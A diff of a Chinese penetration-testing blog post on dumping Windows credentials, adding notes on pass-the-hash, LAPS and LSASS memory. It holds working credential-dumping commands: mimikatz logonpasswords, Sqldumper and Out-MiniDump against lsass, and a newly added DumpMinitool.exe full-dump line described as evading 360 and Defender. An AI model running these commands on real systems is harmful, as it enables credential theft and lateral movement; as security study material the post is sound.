@@ -77,7 +77,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">933</span>
+            <span class="post-count">1.3k</span>
         </span>
     </span>
 
@@ -86,7 +86,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> Reading time≈</span>
-            <span class="post-count">4 min</span>
+            <span class="post-count">5 min</span>
         </span>
     </span>
 </div>
@@ -112,6 +112,16 @@
 <p>31D6CFE0D16AE931B73C59D7E0C089C0是<code>NTLM hash</code></p>
 <p>在<code>域环境</code>中，机器认证是利用kerberos协议，在内网渗透中，域环境中拿到普通域用户/域管 hash，可以尝试pth。</p>
 <p>在<code>工作组</code>环境中如果两台机器如果本地administrator账号密码一样也可能可以pth（实验过）。</p>
+<p> 域环境中如果两台机器如果本地administrator账号密码一样也可能可以pth，所以这就体现<code>LAPS</code>方案重要性。</p>
+<p>LAPS：Local Administrator Password Solution是<strong>本地管理员密码</strong>解决方案</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">安装</span><br><span class="line">powershell Get-ADComputer computername -Properties ms-Mcs-AdmPwd | select name, ms-Mcs-AdmPwd</span><br><span class="line"></span><br><span class="line">如果安装可在软件列表中发现 Local Administrator Password Solution</span><br></pre></td></tr></table></figure>
+
+<p>LAPS允许您在<code>加入域</code>的情况下管理<code>本地管理员密码</code>（<code>随机</code>，唯一且定期更改）电脑。如果计算机未加入域，则将无法使用LAPS。这些密码集中存储在Active Directory中，并且仅限使用ACL的授权用户使用。使用Kerberos v5和AES从客户端到服务器的传输密码受到保护。</p>
+<p>这个功能实现的是让加域的客户端本地administrator账号密码随机化（每一台都不一样的复杂随机密码），并且随机化密码存储在AD上可以查询到，避免***者猜出一台就等于猜出一片，从客户端到服务器的传输过程采用Kerberos v5和AES保护</p>
+<h1 id="LSASS"><a href="#LSASS" class="headerlink" title="LSASS"></a>LSASS</h1><p>lsass进程内存中存储大量敏感信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">encrypted passwords</span><br><span class="line">NT hashes</span><br><span class="line">LM hashes</span><br><span class="line">Kerberos tickets</span><br></pre></td></tr></table></figure>
+
+<p>通过LSASS转储来进行权限提升，数据窃取和横向移动等。</p>
 <h1 id="1-mimikatz"><a href="#1-mimikatz" class="headerlink" title="1. mimikatz"></a>1. mimikatz</h1><p>需要<code>管理员权限</code></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; log.txt </span><br></pre></td></tr></table></figure>
 
@@ -161,6 +171,20 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sqldumper.exe &lt;ProcessID&gt; 0 0x01100    完整转储</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/image-20220330155608001.png" alt="image-20220330155608001"></p>
+<h3 id="DumpMinitool-exe"><a href="#DumpMinitool-exe" class="headerlink" title="DumpMinitool.exe"></a>DumpMinitool.exe</h3><ul>
+<li>过360，wdf  ，自带微软签名</li>
+</ul>
+<p>参考：<a target="_blank" rel="noopener" href="https://twitter.com/mrd0x/status/1511415432888131586/photo/1">https://twitter.com/mrd0x/status/1511415432888131586/photo/1</a></p>
+<p>有写winserver不带这个程序，这点比较限制</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C：\Program Files\Microsoft Visual Studio\2022\Community\Common7\IDE\Extensions\TestPlatform\Extensions</span><br></pre></td></tr></table></figure>
+
+<p>DumpMinitool.exe   </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DumpMinitool.exe   --file  c:\dump.txt  --proccessId xxxx --dumpType Full</span><br></pre></td></tr></table></figure>
+
+
+
+
+
 <h1 id="3-Out-MiniDump"><a href="#3-Out-MiniDump" class="headerlink" title="3. Out-MiniDump"></a>3. Out-MiniDump</h1><p>Out-MiniDump.ps1 wdf直接杀，环境win10下Import-Module 不能执行，可能win server能用吧</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Import-Module Out-MiniDump  </span><br><span class="line"></span><br><span class="line">Get-Process lsass | Out-Minidump   </span><br></pre></td></tr></table></figure>
 
@@ -175,6 +199,7 @@
 <p>方法还有更多，杀软也多种多样，慢慢学习吧</p>
 <p>参考：</p>
 <p>一些获取Windows明文凭据的方法 | Loong716]：<a target="_blank" rel="noopener" href="https://loong716.top/posts/lsass/">https://loong716.top/posts/lsass/</a></p>
+<p><a target="_blank" rel="noopener" href="https://redcanary.com/threat-detection-report/techniques/lsass-memory/">LSASS 内存 - 威胁检测报告 - 红色金丝雀 (redcanary.com)</a></p>
 <h1 id="tips"><a href="#tips" class="headerlink" title="tips:"></a>tips:</h1><ol>
 <li>winserver2012以后只能抓到用户hash，抓不到明文，但可以通过修改注册表**<code>开启Wdigest Auth</code>**，</li>
 </ol>
